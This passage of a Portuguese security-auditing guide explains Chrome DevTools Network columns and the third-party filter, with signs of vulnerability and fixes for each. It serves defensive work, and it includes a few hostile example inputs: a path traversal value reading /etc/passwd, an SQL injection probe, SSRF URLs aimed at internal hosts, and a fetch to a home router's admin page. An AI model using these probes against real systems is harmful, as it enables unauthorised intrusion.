- **Para que serve**: auditar a superfície de ataque de cadeia de suprimentos (*Supply Chain*), rastreadores de privacidade, scripts externos e vazamento de dados para empresas terceiras.
- **Onde encontrar no DevTools**: painel **Network** → barra de filtros → checkbox **3rd-party requests**.
- **Exemplo prático**:
  Você acessa `https://loja-ficticia.test/checkout` (que faz 80 requisições totais) e marca **3rd-party requests**. As 65 requisições para `loja-ficticia.test` e `api.loja-ficticia.test` (que são *first-party* / mesmo site) somem, e sobram apenas 15 requisições para `analytics-exemplo.test`, `chat-suporte.test` e `ads-network.test`.
- **Comportamento normal**: exibe integrações externas utilizadas pela página (fontes, CDNs públicas, gateways de pagamento, ferramentas de suporte ou *analytics*).
- **O que seria considerado seguro**:
  - Em telas críticas (login, redefinição de senha, checkout bancário, prontuário médico), ter o **mínimo possível (idealmente zero)** de scripts de terceiros sendo executados no contexto do documento principal **[RECOMENDAÇÃO]**.
  - Nenhuma requisição de terceiro recebendo dados pessoais (e-mail, CPF, nome, endereço) ou tokens na URL ou no corpo.
- **O que poderia indicar uma vulnerabilidade**:
  1. **Ataque Magecart / Web Skimming**: na página de pagamento com cartão de crédito, um script de terceiro envia um `POST` contendo os dígitos do cartão e o CVV para um domínio externo.
  2. **Vazamento de Token de Redefinição de Senha via `Referer`**: o usuário clica no link do e-mail `https://loja-ficticia.test/reset?token=SEGREDO123`; a página carrega um script de terceiro (`3rd-party requests`) e envia `Referer: https://loja-ficticia.test/reset?token=SEGREDO123` para o servidor externo!
- **Como investigar o problema**: em páginas de login, recuperação de senha e pagamento, marque **3rd-party requests**, examine cada domínio listado e verifique nas abas **Headers** (campo `Referer`) e **Payload** quais informações estão saindo para fora da organização.
- **Como corrigir ou prevenir**: isolar ou remover scripts de terceiros em páginas que manipulam credenciais e cartões de crédito (requisito **PCI-DSS v4.0** seção 6.4.3 / 11.6.1) (**[REQUISITO]**), usar **SRI** em bibliotecas externas (**[RECOMENDAÇÃO]**) e configurar `Referrer-Policy: same-origin` ou `strict-origin` em páginas sensíveis (**[RECOMENDAÇÃO]**).

---

<a id="s2-1-4"></a>
#### 2.1.4 Colunas da lista de requisições

A **Tabela de Requisições (*Requests Table*)** é o coração analítico da aba Network. Por padrão, o Chrome DevTools exibe apenas um subconjunto compacto de colunas (`Name`, `Status`, `Type`, `Initiator`, `Size`, `Time` e `Waterfall`). Entretanto, para auditorias de segurança da informação e diagnósticos de redes de computadores, **as colunas ocultas por padrão são frequentemente as mais valiosas** (como `Method`, `Protocol`, `Scheme`, `Domain`, `Remote Address`, `Remote Address Space`, `Cookies`, `Set Cookies` e colunas personalizadas de cabeçalhos de resposta).

##### Como personalizar as colunas da tabela na aba Network

Para exibir, ocultar ou criar novas colunas na tabela de requisições:
1. Clique com o **botão direito do mouse** sobre o cabeçalho de qualquer coluna existente (por exemplo, sobre o título `Name` ou `Status`).
2. No menu de contexto que se abre, marque ou desmarque as colunas desejadas (`Method`, `Protocol`, `Scheme`, `Domain`, `Remote Address`, `Cookies`, `Set Cookies`, etc.).
3. Para adicionar uma coluna que mostre o valor de qualquer cabeçalho HTTP de resposta específico (como `Server`, `Content-Security-Policy` ou `Access-Control-Allow-Origin`), posicione o mouse sobre o submenu **Response Headers** → clique em **Manage Header Columns...** → clique em **Add custom header** e digite o nome do cabeçalho desejado **[BOA PRÁTICA]**.

A seguir, todas as 21 colunas da lista de requisições são detalhadas com a ficha técnica de 10 pontos.

##### Name

- **Nome do parâmetro**: **Name** (Nome do recurso).
- **O que significa**: exibe o segmento final do caminho da URL (o nome do arquivo ou do último segmento da rota da API, acrescido da *query string* se houver), como `index.html`, `bundle.js` ou `login?redirect=/home`. Se a opção **Use large request rows** estiver ativa nas configurações da aba Network, exibe o nome em cima e o diretório/domínio logo abaixo.
- **Para que serve**: identificar rapidamente qual arquivo ou endpoint foi requisitado e abrir o painel de detalhes ao clicar sobre ele.
- **Onde encontrar no DevTools**: painel **Network** → primeira coluna fixa à esquerda da tabela de requisições.
- **Exemplo prático**:
  Para a URL `https://api.loja-ficticia.test/v1/clientes/42/faturas?ano=2026`, a coluna **Name** exibe:
  ```text
  faturas?ano=2026
  ```
- **Comportamento normal**: exibe o nome final da URL acompanhado de um ícone à esquerda que indica a natureza ou o status do recurso (ícone de documento, imagem, engrenagem ou alerta colorido em caso de erro 4xx/5xx). Ao passar o mouse sobre o valor de **Name**, um *tooltip* mostra a URL completa.
- **O que seria considerado seguro**: nomes de endpoints limpos, sem credenciais, tokens, senhas ou dados pessoais (CPF, e-mail, número de cartão) expostos na *query string* visível no nome.
- **O que poderia indicar uma vulnerabilidade**:
  1. **Credenciais ou PII na Query String**: ver na coluna **Name** itens como `autenticar?usuario=admin&senha=123456` ou `consulta?cpf=12345678900&token=eyJ...`. Dados na URL ficam gravados em claro no histórico do navegador, nos logs de acesso do servidor web (Apache/Nginx), em proxies corporativos e no cabeçalho `Referer`.
  2. **Arquivos sensíveis ou de backup expostos**: observar chamadas ou testar acesso a nomes como `.env`, `config.php.bak`, `dump.sql`, `.git/HEAD` ou `bundle.js.map`.
- **Como investigar o problema**: percorra a coluna **Name** (ou ative também as colunas **Path** e **URL**) procurando por sinais de interrogação (`?`) que carreguem parâmetros sensíveis, ou identificadores sequenciais (`/usuarios/1`, `/usuarios/2`).
- **Como corrigir ou prevenir**: transmitir dados sensíveis, senhas e tokens exclusivamente no **corpo da requisição** (`POST`/`PUT`/`PATCH`) ou em cabeçalhos apropriados (`Authorization` / `Cookie`) sobre HTTPS, nunca na URL **[REQUISITO]**.

##### Path

- **Nome do parâmetro**: **Path** (Caminho completo na URL).
- **O que significa**: coluna opcional que exibe todo o caminho hierárquico do recurso no servidor a partir da raiz do domínio (incluindo os diretórios intermediários, o nome do arquivo e a *query string*), omitindo apenas o esquema (`https://`) e o host (`api.loja-ficticia.test`).
- **Para que serve**: diferenciar endpoints que possuem o mesmo nome final (na coluna `Name`), mas pertencem a módulos ou versões diferentes da API (por exemplo, distinguir `/api/v1/usuarios/perfil` de `/api/v2/admin/perfil`, ambos mostrados apenas como `perfil` na coluna `Name`).
- **Onde encontrar no DevTools**: clique com o botão direito no cabeçalho da tabela **Network** → marque **Path**.
- **Exemplo prático**:
  Enquanto a coluna **Name** mostra apenas `42`, a coluna **Path** revela:
  ```text
  /api/v1/admin/usuarios/42
  ```
- **Comportamento normal**: começa sempre com `/` para requisições HTTP convencionais.
- **O que seria considerado seguro**: estrutura de caminhos consistente, sem diretórios internos do sistema operacional expostos e com controle de acesso aplicado no servidor para todas as rotas administrativas (`/admin/*`, `/internal/*`).
- **O que poderia indicar uma vulnerabilidade**:
  1. **Broken Function Level Authorization (BFLA — Falha de Autorização em Nível de Função)**: um usuário comum descobre na coluna **Path** que a aplicação chama `/api/v1/cliente/relatorio` e, ao testar `/api/v1/admin/relatorio`, obtém acesso porque o servidor não validou o perfil (`role`).
  2. **Indícios de Path Traversal / Local File Inclusion (LFI)**: caminhos que passam nomes de arquivos como parâmetro, como `/download?arquivo=../../etc/passwd` ou `/visualizar?template=relatorio_mensal.pdf`.
  3. **API antiga esquecida ativa (*Shadow / Zombie API*)**: notar chamadas para `/api/v1/login` (sem rate limiting ou sem MFA) coexistindo com `/api/v3/login`.
- **Como investigar o problema**: ative a coluna **Path**, ordene por ela clicando no título da coluna e mapeie toda a árvore de endpoints da API (versões `v1`, `v2`, prefixos `/public`, `/private`, `/admin`) e parâmetros que recebem nomes de arquivos.
- **Como corrigir ou prevenir**: aplicar *middlewares* de autenticação e autorização baseados em papéis (**RBAC — Role-Based Access Control**) ou atributos (**ABAC**) em todas as rotas no servidor (**[REQUISITO]**) e desativar versões legadas de API (**[RECOMENDAÇÃO]**).

##### URL

- **Nome do parâmetro**: **URL** (*Uniform Resource Locator* — Localizador Uniforme de Recursos completo).
- **O que significa**: coluna opcional que exibe a URL integral da requisição em uma única célula: `esquema://host:porta/caminho?query_string`.
- **Para que serve**: visualizar simultaneamente o protocolo, o subdomínio, a porta, o caminho e os parâmetros de todas as requisições sem precisar passar o mouse sobre a coluna `Name` nem abrir a aba `Headers`.
- **Onde encontrar no DevTools**: clique com o botão direito no cabeçalho da tabela **Network** → marque **URL**.
- **Exemplo prático**:
  ```text
  https://api.loja-ficticia.test:8443/v2/pedidos?status=aberto&limite=20
  ```
- **Comportamento normal**: exibe a string completa da URL solicitada (exceto o fragmento `#hash`, que é processado exclusivamente no cliente e nunca trafega na rede).
- **O que seria considerado seguro**: todas as URLs utilizando `https://` ou `wss://`, apontando para domínios esperados e sem dados confidenciais na *query string*.
- **O que poderia indicar uma vulnerabilidade**:
  - **Indícios de SSRF (Server-Side Request Forgery) ou Open Redirect**: URLs que recebem outra URL completa dentro de um parâmetro, como `https://loja-ficticia.test/proxy-imagem?url=http://estoque.interno.local:8080/status` ou `https://loja-ficticia.test/Sair?proximaPagina=https://outro-site.test`.
- **Como investigar o problema**: com a coluna **URL** visível (ou usando a caixa Filter com `http` no meio da query string), procure por parâmetros que recebam URLs, endereços IP ou nomes de host (`?url=`, `?redirect=`, `?next=`, `?webhook=`, `?callback=`).
- **Como corrigir ou prevenir**: nunca buscar URLs arbitrárias fornecidas pelo cliente no back-end sem validar contra uma *allowlist* estrita de domínios e bloquear faixas de IPs privados/loopback/metadados de nuvem (`169.254.169.254`, `127.0.0.0/8`, `10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`) **[REQUISITO]**.

##### Method

- **Nome do parâmetro**: **Method** (Método / Verbo HTTP).
- **O que significa**: coluna (oculta por padrão, mas **indispensável** em qualquer análise técnica) que mostra o método HTTP utilizado na requisição (`GET`, `POST`, `PUT`, `PATCH`, `DELETE`, `OPTIONS`, `HEAD`).
- **Para que serve**: verificar imediatamente a semântica da operação realizada em cada requisição e identificar chamadas de criação, alteração ou exclusão de dados, além de requisições de *preflight* **CORS (`OPTIONS`)**.
- **Onde encontrar no DevTools**: clique com o botão direito no cabeçalho da tabela **Network** → marque **Method**.
- **Exemplo prático**:
  ```text
  Name          | Method  | Status | Type
  --------------|---------|--------|------
  usuarios      | OPTIONS | 204    | preflight
  usuarios      | POST    | 201    | fetch
  42            | DELETE  | 204    | fetch
  ```
- **Comportamento normal**: operações de leitura/consulta usam `GET`; criação ou ações de processamento como login usam `POST`; substituição integral usa `PUT`; atualização parcial usa `PATCH`; exclusão usa `DELETE`; negociação prévia de CORS entre origens usa `OPTIONS`.
- **O que seria considerado seguro**: respeito estrito à semântica HTTP definida na **RFC 9110** (métodos *Safe* como `GET`, `HEAD` e `OPTIONS` **jamais** alteram dados no servidor; ações de escrita ou autenticação usam `POST`, `PUT`, `PATCH` ou `DELETE`).
- **O que poderia indicar uma vulnerabilidade**:
  1. **Login ou envio de senha via `GET`**: credenciais ficam expostas na URL.
  2. **Ação de alteração de estado via `GET`** (ex.: `GET /api/usuarios/42/deletar` ou `GET /api/aprovar-pagamento?id=99`): torna a aplicação trivialmente vulnerável a **CSRF (Cross-Site Request Forgery)** mesmo com cookies `SameSite=Lax` (já que `SameSite=Lax` envia cookies em navegações `GET` de nível superior!) e permite que *prefetchers* do navegador ou robôs de busca acionem exclusões acidentalmente.
  3. **HTTP Verb Tampering (Manipulação de Verbo HTTP)**: quando uma regra de segurança mal escrita bloqueia `POST /admin/exportar`, mas aceita `GET /admin/exportar` ou `HEAD /admin/exportar`.
- **Como investigar o problema**: ative a coluna **Method** em todas as sessões de uso do DevTools; execute ações de cadastro, edição, exclusão e login e confirme que nenhuma delas utilizou o método `GET`.
- **Como corrigir ou prevenir**: restringir explicitamente no roteador do back-end quais métodos HTTP cada rota aceita (retornando `405 Method Not Allowed` para os demais) e exigir `POST`/`PUT`/`PATCH`/`DELETE` para qualquer operação que modifique estado ou autentique usuários **[REQUISITO]**.

##### Status

- **Nome do parâmetro**: **Status** (Código de status da resposta HTTP ou estado interno do navegador).
- **O que significa**: coluna que exibe o código numérico de 3 dígitos retornado pelo servidor HTTP (`1xx`, `2xx`, `3xx`, `4xx`, `5xx` — conforme a **RFC 9110**) ou um indicador textual entre parênteses quando a requisição não completou o ciclo HTTP normal (como `(failed)`, `(canceled)`, `(blocked:csp)`, `(blocked:mixed-content)`, `(blocked:cors)`, `CORS error`).
- **Para que serve**: identificar instantaneamente se a requisição foi bem-sucedida (`200`, `201`, `204`), redirecionada (`301`, `302`, `307`, `308`), reutilizada do cache (`304`), recusada por erro do cliente/autenticação/autorização (`400`, `401`, `403`, `404`, `422`, `429`) ou se falhou no servidor (`500`, `502`, `503`, `504`).
- **Onde encontrar no DevTools**: painel **Network** → coluna padrão **Status** (logo à direita de `Name`, caso `Method` não tenha sido inserido entre elas).
- **Exemplo prático**:
  ```text
  Name             | Status               | Significado prático
  -----------------|----------------------|---------------------------------------------------
  login            | 200                  | Login aceito com sucesso
  painel-admin     | 403                  | Usuário autenticado, mas sem permissão (Forbidden)
  relatorio?id=1'  | 500                  | Erro interno no servidor (possível SQL Injection!)
  tracker.js       | (blocked:csp)        | Bloqueado pela Content Security Policy no navegador
  ```
- **Comportamento normal**: predominância de `200`, `201`, `204`, `206` e `304`, com eventuais `301`/`302` em navegações legítimas. Linhas com códigos `4xx`, `5xx` ou falhas de bloqueio são destacadas em **vermelho** pelo DevTools.
- **O que seria considerado seguro**:
  - Retornar **`401 Unauthorized`** quando o usuário não está autenticado (ou o token expirou) e **`403 Forbidden`** quando está autenticado mas não tem permissão para aquele recurso (ou retornar `404 Not Found` intencionalmente para não revelar a existência de um recurso privado).
  - Retornar **`429 Too Many Requests`** após múltiplas tentativas seguidas de login incorreto (comprovando a presença de *Rate Limiting* contra força bruta).
- **O que poderia indicar uma vulnerabilidade**:
  1. **Ausência de `429 Too Many Requests`**: disparar 100 tentativas de login ou de código OTP (*One-Time Password*) seguidas e todas responderem `401` (sem bloqueio por *Rate Limiting*).
  2. **Status `500 Internal Server Error` ao inserir caracteres especiais (`'`, `"`, `<`, `;`, `../`)**: forte indicador de que a entrada do usuário quebrou o interpretador SQL ou o código do servidor sem tratamento parametrizado.
  3. **"HTTP 200 OK" falso com erro de permissão apenas visual**: uma API mal programada que retorna `200 OK` contendo os dados do usuário no JSON junto com `"erro": "Acesso negado"` (permitindo ler os dados na aba *Response* apesar do aviso na tela).
- **Como investigar o problema**: ordene a tabela clicando no cabeçalho da coluna **Status** (ou filtre com `status-code:500`, `status-code:403`, `status-code:401`) e inspecione a aba **Response** de todas as respostas de erro para verificar se vazam *stack traces* ou dados indevidos.
- **Como corrigir ou prevenir**: utilizar os códigos de status HTTP corretos (**[BOA PRÁTICA]**), implementar *Rate Limiting* (`429`) em rotas de autenticação e APIs críticas (**[REQUISITO]**) e nunca vazar detalhes internos em respostas `500` (**[REQUISITO]**). Veja a [Seção 1.5 Códigos de Status HTTP](./01a-fundamentos-web-parte1.md#s1).

##### Protocol

- **Nome do parâmetro**: **Protocol** (Protocolo de camada de aplicação / negociação ALPN).
- **O que significa**: coluna opcional que exibe a versão exata do protocolo de aplicação utilizado para transferir o recurso, conforme negociado durante o *handshake* TLS via **ALPN (Application-Layer Protocol Negotiation — RFC 7301)** ou pelo esquema da URL.
- **Para que serve**: verificar se a aplicação está utilizando protocolos modernos multiplexados e criptografados (**HTTP/2** ou **HTTP/3 sobre QUIC**) ou se ainda opera em **HTTP/1.1** legado, além de identificar de onde vieram recursos especiais (`data`, `blob`, `chrome-extension`).
- **Onde encontrar no DevTools**: clique com o botão direito no cabeçalho da tabela **Network** → marque **Protocol**.
- **Exemplo prático**:
  Valores exibidos na coluna **Protocol**:
  - **`http/1.1`**: HTTP/1.1 tradicional sobre TCP (RFC 9112).
  - **`h2`**: HTTP/2 sobre TLS/TCP (RFC 9113) — binário, com multiplexação de streams e compressão de cabeçalhos **HPACK**.
  - **`h3`**: HTTP/3 sobre **QUIC / UDP** (RFC 9114 e RFC 9000) — multiplexado sem *Head-of-Line Blocking* na camada de transporte e com TLS 1.3 integrado.
  - **`ws` / `wss`** (ou `http/1.1` no upgrade `101`): conexões WebSocket.
  - **`data` / `blob`**: pseudo-protocolos em memória local.
- **Comportamento normal**: servidores e CDNs modernos exibem **`h2`** ou **`h3`** para todas as requisições HTTPS (na primeira visita pode aparecer `h2` e, após o navegador receber o cabeçalho `Alt-Svc: h3=":443"`, as conexões seguintes migram para `h3`).
- **O que seria considerado seguro**: uso de **`h2`** ou **`h3`** sobre TLS 1.2/1.3 com servidores atualizados **[RECOMENDAÇÃO]**.
- **O que poderia indicar uma vulnerabilidade**:
  1. **HTTP Request Smuggling (Contrabando de Requisições HTTP — `CL.TE`, `TE.CL` ou `H2.CL` / `H2.TE`)**: quando um proxy reverso/CDN aceita `h2` na borda e faz *downgrade* mal validado para `http/1.1` na comunicação com o servidor de back-end, permitindo que um atacante dessincronize a fila de requisições e sequestre respostas de outros usuários.
  2. **`h2c` (HTTP/2 Cleartext)**: tentativa de upgrade para HTTP/2 sem criptografia via cabeçalho `Upgrade: h2c` que, se repassado indevidamente por um proxy reverso mal configurado, permite criar um túnel direto contornando regras de acesso do proxy.
- **Como investigar o problema**: ative a coluna **Protocol** junto com a coluna **Connection ID** para observar como as requisições são multiplexadas na mesma conexão TCP/QUIC (veja mais na subseção `2.1.7`).
- **Como corrigir ou prevenir**: manter proxies reversos (Nginx, Envoy, HAProxy, Cloudflare) atualizados contra vulnerabilidades de *HTTP/2 Rapid Reset* (CVE-2023-44487) e *H2 Request Smuggling*, e normalizar rigorosamente cabeçalhos antes de converter `h2`/`h3` para `http/1.1` no back-end **[REQUISITO]**.

##### Scheme

- **Nome do parâmetro**: **Scheme** (Esquema da URL).
- **O que significa**: coluna opcional que exibe isoladamente a primeira parte da URL (antes de `://`), identificando o esquema de endereçamento e segurança da requisição (`https`, `http`, `wss`, `ws`, `data`, `blob`, `chrome-extension`).
- **Para que serve**: realizar a verificação mais rápida e visual de **criptografia em trânsito** em toda a tabela de requisições: basta bater o olho na coluna **Scheme** para confirmar se tudo é `https` / `wss` ou se escapou algum `http` / `ws`.
- **Onde encontrar no DevTools**: clique com o botão direito no cabeçalho da tabela **Network** → marque **Scheme**.
- **Exemplo prático**:
  ```text
  Name             | Scheme | Status
  -----------------|--------|--------
  index.html       | https  | 200
  app.js           | https  | 200
  banner-antigo.jpg| http   | 200    <- Alerta! Mixed Content passivo em HTTP!
  ```
- **Comportamento normal**: em qualquer aplicação moderna segura, 100% das requisições de rede devem exibir `https` (ou `wss` para WebSockets).
- **O que seria considerado seguro**: ausência total de `http` e `ws` (exceto durante testes em `http://localhost` de desenvolvimento local) **[REQUISITO]**.
- **O que poderia indicar uma vulnerabilidade**:
  1. **Tráfego de credenciais ou sessão em texto claro (`Scheme: http` ou `ws`)**: vulnerável a interceptação passiva (*sniffing*) e ataques **MitM (Man-in-the-Middle)** em redes Wi-Fi ou provedores intermediários.
  2. **Mixed Content (Conteúdo Misto)**: página principal em `https`, mas imagens, vídeos ou scripts chamados com `Scheme: http`.
  3. **SSL Stripping / Downgrade inicial**: primeira requisição da página ocorrendo em `Scheme: http` antes de receber um `301`/`302` para `https`, por falta de **HSTS (`Strict-Transport-Security`)**.
- **Como investigar o problema**: ative a coluna **Scheme** e clique no título dela para ordenar em ordem alfabética (`http` aparecerá agrupado antes de `https`), ou digite `scheme:http` na caixa **Filter**.
- **Como corrigir ou prevenir**: redirecionar todo tráfego da porta `80` (`http`) para `443` (`https`) com `301 Moved Permanently` (**[REQUISITO]**), ativar o cabeçalho **HSTS (`Strict-Transport-Security: max-age=31536000; includeSubDomains`)** (**[RECOMENDAÇÃO]**) e incluir `Content-Security-Policy: upgrade-insecure-requests` (**[BOA PRÁTICA]**).

##### Domain

- **Nome do parâmetro**: **Domain** (Domínio / Host de destino da requisição).
- **O que significa**: coluna opcional que exibe o nome de domínio completo (**FQDN — Fully Qualified Domain Name**) ou endereço IP para o qual a requisição foi enviada (ex.: `loja-ficticia.test`, `api.loja-ficticia.test`, `cdn.terceiro.test`).
- **Para que serve**: mapear todas as origens e servidores externos com os quais a aplicação se comunica, essencial para construir uma política de **CSP (Content Security Policy)** ou detectar **exfiltração de dados** e **scripts maliciosos de terceiros**.
- **Onde encontrar no DevTools**: clique com o botão direito no cabeçalho da tabela **Network** → marque **Domain**.
- **Exemplo prático**:
  ```text
  Name        | Domain                    | Type
  ------------|---------------------------|-------
  index.html  | www.loja-ficticia.test    | document
  produtos    | api.loja-ficticia.test    | fetch
  sdk.js      | cdn.analytics-externo.test| script
  ```
- **Comportamento normal**: exibe o domínio principal da aplicação, seus subdomínios de API/CDN e os serviços terceiros homologados.
- **O que seria considerado seguro**: todos os domínios listados na coluna **Domain** pertencendo ao inventário conhecido de ativos da aplicação e com registros DNS válidos e monitorados.
- **O que poderia indicar uma vulnerabilidade**:
  1. **Subdomain Takeover (Tomada de Subdomínio)**: a página tenta carregar um script de `campanha2022.loja-ficticia.test` que retorna erro ou aponta (via registro `CNAME` órfão no DNS) para um serviço em nuvem desativado (GitHub Pages, S3, Azure) que um atacante pode registrar em seu próprio nome para servir JavaScript malicioso dentro do escopo `*.loja-ficticia.test`!
  2. **Comunicação com C2 (Command and Control)**: presença de domínios estranhos recém-registrados ou endereços IP diretos recebendo requisições `POST` ou imagens com parâmetros codificados em Base64.
- **Como investigar o problema**: ative a coluna **Domain**, clique no cabeçalho dela para agrupar todas as requisições por domínio e verifique cada domínio externo diferente da aplicação principal, bem como subdomínios que retornaram erro `404` ou falha de DNS (`ERR_NAME_NOT_RESOLVED`).
- **Como corrigir ou prevenir**: remover do DNS registros `CNAME` que apontam para serviços externos desativados (**[REQUISITO]**) e declarar explicitamente na **CSP** todos os domínios autorizados (**[RECOMENDAÇÃO]**).

##### Remote Address

- **Nome do parâmetro**: **Remote Address** (Endereço IP remoto e porta TCP/UDP de destino).
- **O que significa**: coluna opcional que exibe o endereço **IP (IPv4 ou IPv6)** real ao qual o navegador se conectou após a resolução **DNS**, seguido de dois pontos e do número da **porta de transporte** (ex.: `203.0.113.50:443` ou `[2001:db8::1]:443`).
- **Para que serve**: correlacionar a análise da camada de aplicação (HTTP) com a camada de rede (IP) e de transporte (Portas TCP/UDP), verificando se o tráfego está passando por uma **CDN / WAF** (como Cloudflare, Akamai, AWS CloudFront) ou indo diretamente para um servidor de origem, e em qual porta o serviço está escutando.
- **Onde encontrar no DevTools**: clique com o botão direito no cabeçalho da tabela **Network** → marque **Remote Address** (também visível dentro de `Headers → General → Remote Address`).
- **Exemplo prático**:
  ```text
  Name          | Domain                    | Remote Address
  --------------|---------------------------|--------------------
  index.html    | www.loja-ficticia.test    | 198.51.100.10:443   <- IP da CDN/WAF
  relatorio.pdf | dev-api.loja-ficticia.test| 203.0.113.99:8080   <- IP direto do servidor na porta 8080!
  ```
- **Comportamento normal**: para sites HTTPS padrão, a porta é `:443` (e `:80` para HTTP). Quando o recurso vem do cache local sem tocar na rede, pode exibir o endereço do servidor original da época em que foi cacheado ou ficar em branco para recursos `data:`.
- **O que seria considerado seguro**:
  - Todos os subdomínios públicos passando pelo endereço IP do **Proxy Reverso / WAF / CDN** na porta `:443`.
  - Nenhum servidor de banco de dados ou porta administrativa de desenvolvimento (`:8080`, `:3000`, `:5000`, `:9200` Elasticsearch) exposta diretamente ao navegador do cliente.
- **O que poderia indicar uma vulnerabilidade**:
  1. **Origin IP Leak (Exposição do IP Real do Servidor por trás da CDN/WAF)**: enquanto `www.loja-ficticia.test` resolve para o IP do WAF (`198.51.100.10:443`), uma chamada secundária para `upload.loja-ficticia.test` mostra em **Remote Address** o IP real do servidor de hospedagem (`203.0.113.99:443`). Com esse IP, um atacante pode atacar o servidor diretamente, contornando 100% da proteção do WAF e de DDoS da CDN!
  2. **Portas não padronizadas ou de homologação expostas**: requisições indo para `:8080`, `:8000` ou `:3000` (típicas de servidores Node.js, Python/Flask ou Spring Boot rodando em modo *debug*).
  3. **Requisições para IPs de rede local do próprio visitante**: um site na internet tentando conectar-se a `127.0.0.1:9222` (porta de depuração do Chrome) ou `192.168.1.1:80` (roteador doméstico da vítima).
- **Como investigar o problema**: ative as colunas **Domain** e **Remote Address** lado a lado e compare os endereços IP e portas de todos os subdomínios da aplicação.
- **Como corrigir ou prevenir**: configurar o firewall do servidor de origem para aceitar tráfego nas portas `80`/`443` **exclusivamente** a partir da lista de endereços IP do WAF/CDN (**[REQUISITO]**) e nunca expor portas de servidores de desenvolvimento diretamente para a internet (**[REQUISITO]**).

##### Remote Address Space

- **Nome do parâmetro**: **Remote Address Space** (Espaço de endereçamento IP do destino).
- **O que significa**: coluna opcional introduzida como parte da especificação **Private Network Access (PNA — Acesso à Rede Privada, anteriormente conhecida como CORS-RFC1918)** do W3C/WICG. Ela classifica o endereço IP do servidor de destino (**Remote Address**) em um dos três espaços de rede (ou `Loopback` / `Local` / `Public` **[Varia por versão]**):
  - **`Public`**: endereços IP roteáveis globalmente na internet pública (ex.: `203.0.113.50`).
  - **`Private`** (ou **`Local`** em versões recentes da especificação): endereços IP de rede local/interna reservados pela **RFC 1918** (`10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`), link-local (`169.254.0.0/16`) ou IPv6 Unique Local (`fc00::/7`) / Link-Local (`fe80::/10`).
  - **`Local`** (ou **`Loopback`**): a própria máquina local (`127.0.0.0/8`, `::1`).
- **Para que serve**: monitorar e proteger o usuário contra ataques em que um site público na internet tenta usar o navegador da vítima como ponte (*proxy* involuntário) para atacar dispositivos dentro da rede interna da casa ou da empresa da vítima!
- **Onde encontrar no DevTools**: clique com o botão direito no cabeçalho da tabela **Network** → marque **Remote Address Space**.
- **Exemplo prático**:
  Se você abre um site público `https://blog-qualquer.test` (`Public`) e um script dentro dele tenta fazer `fetch("http://192.168.0.1/admin")` ou `fetch("http://127.0.0.1:8080/api")`, a coluna **Remote Address Space** exibirá `Private` ou `Local` (em comparação com o `Initiator Address Space` que é `Public`).
- **Comportamento normal**: quando você navega na internet, tanto o site quanto todas as suas requisições têm **Remote Address Space** igual a `Public`. Quando você desenvolve localmente em `localhost`, o valor é `Local`.
- **O que seria considerado seguro**: um site com origem `Public` comunicando-se exclusivamente com servidores `Public`. Caso uma aplicação corporativa pública precise legitimamente conversar com um agente local na máquina do usuário (`Local` ou `Private`), deve ocorrer sobre HTTPS com *preflight* CORS contendo o cabeçalho `Access-Control-Request-Private-Network: true` e resposta explícita `Access-Control-Allow-Private-Network: true`.
- **O que poderia indicar uma vulnerabilidade**:
  - **Ataque de CSRF / SSRF via Navegador contra a Rede Interna (Drive-By Pharming / DNS Rebinding)**: uma página pública (`Initiator Address Space: Public`) disparando silenciosamente requisições para `Remote Address Space: Private` ou `Local` na tentativa de explorar roteadores domésticos (`192.168.1.1`), impressoras de rede, painéis internos da intranet corporativa (`10.0.0.x`) ou agentes locais de desenvolvimento (Docker, bancos locais, carteiras locais).
- **Como investigar o problema**: ative simultaneamente as colunas **Initiator Address Space** e **Remote Address Space**; qualquer linha onde a primeira for `Public` e a segunda for `Private` ou `Local` exige investigação imediata da coluna **Initiator**.
- **Como corrigir ou prevenir**: manter o navegador atualizado (que bloqueia requisições de redes mais públicas para mais privadas sem o *preflight* `Access-Control-Allow-Private-Network: true`) e, ao desenvolver serviços que escutam em `127.0.0.1` ou na intranet, sempre exigir autenticação e validar o cabeçalho `Origin` e `Host` (proteção contra **DNS Rebinding**) **[REQUISITO]**.

##### Type

- **Nome do parâmetro**: **Type** (Tipo interno do recurso carregado).
- **O que significa**: coluna padrão que indica a categoria técnica do recurso segundo o mecanismo de carregamento do Chromium (`document`, `stylesheet`, `script`, `fetch`, `xhr`, `font`, `png`, `jpeg`, `webp`, `svg`, `gif`, `media`, `manifest`, `websocket`, `wasm`, `preflight`, `ping`, `text/plain`, `json`).
- **Para que serve**: distinguir como o navegador interpretou e para qual finalidade baixou aquele recurso (por exemplo, diferenciar se um JSON foi aberto diretamente na barra de endereços como `document` ou buscado por código via `fetch`, ou identificar se uma requisição `OPTIONS` foi um `preflight` automático do CORS).
- **Onde encontrar no DevTools**: painel **Network** → coluna padrão **Type**.
- **Exemplo prático**:
  ```text
  Name          | Method  | Status | Type
  --------------|---------|--------|-----------
  index.html    | GET     | 200    | document
  api.js        | GET     | 200    | script
  pedidos       | OPTIONS | 204    | preflight
  pedidos       | POST    | 201    | fetch
  ```
- **Comportamento normal**: cada recurso apresenta um `Type` coerente com sua extensão e com o cabeçalho `Content-Type` retornado pelo servidor.
- **O que seria considerado seguro**:
  - Alinhamento estrito entre o `Type` esperado pelo navegador e o cabeçalho `Content-Type` enviado pelo servidor, blindado pelo cabeçalho `X-Content-Type-Options: nosniff`.
- **O que poderia indicar uma vulnerabilidade**:
  1. **MIME Sniffing / Execução de Arquivo de Upload como Script ou HTML**: um usuário faz upload de uma foto `avatar.jpg` que na verdade contém código HTML/JavaScript; se o servidor não enviar `X-Content-Type-Options: nosniff` ou responder com `Content-Type: text/html` ao abrir a imagem diretamente, a coluna **Type** mostrará `document` ou `script` em vez de `jpeg`, executando **XSS Armazenado**!
  2. **JSONP inseguro / Cross-Site Script Inclusion (XSSI)**: um endpoint de API que retorna dados dinâmicos sendo carregado com `Type: script` (via `<script src="https://api.exemplo.test/dados?callback=...">`), permitindo que qualquer site externo leia a resposta contornando a **Same-Origin Policy (SOP)**.
- **Como investigar o problema**: observe a coluna **Type**; se vir qualquer rota de API de dados sendo carregada com `Type: script` ou qualquer arquivo enviado por usuário sendo carregado com `Type: document` ou `script`, inspecione imediatamente os cabeçalhos `Content-Type` e `X-Content-Type-Options`.
